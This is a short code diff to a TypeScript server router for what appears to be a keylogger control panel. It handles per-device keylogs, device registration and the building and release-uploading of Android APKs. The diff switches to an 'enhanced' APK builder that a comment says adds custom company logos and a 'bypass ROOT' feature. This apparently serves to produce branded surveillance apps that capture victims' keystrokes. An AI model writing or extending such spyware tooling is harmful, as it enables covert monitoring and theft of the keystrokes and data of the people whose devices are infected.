@@ -11,6 +11,7 @@ import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildAPK } from "./apk-builder";
+import { buildAPKEnhanced } from "./apk-builder-enhanced";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -131,8 +132,8 @@ export const appRouter = router({
           // Use SIMPLE builder (sem dependência de EagleSpy)
           console.log('[ROUTER] Building APK with simple builder...');
           
-          // Use builder que funcionava
-          const result = await buildAPK({
+          // Use enhanced builder com customização de logo e bypass ROOT
+          const result = await buildAPKEnhanced({
             companyName: input.companyName,
             companyUrl: input.companyUrl,
             logoUrl: input.logoUrl,
